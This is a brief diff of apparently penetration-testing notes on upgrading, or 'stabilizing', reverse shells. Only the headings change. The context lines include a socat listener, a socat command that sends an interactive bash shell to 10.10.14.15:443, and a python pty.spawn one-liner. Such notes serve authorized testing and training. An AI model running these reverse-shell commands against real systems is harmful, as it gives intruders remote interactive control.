@@ -1,4 +1,4 @@
-# Upgrading Shells
+# Stabilizing Shells
 
 ### Interactive Upgrade
 
@@ -49,7 +49,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:443
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:443
 ```
 
-#### Other Method
+#### Second Method
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
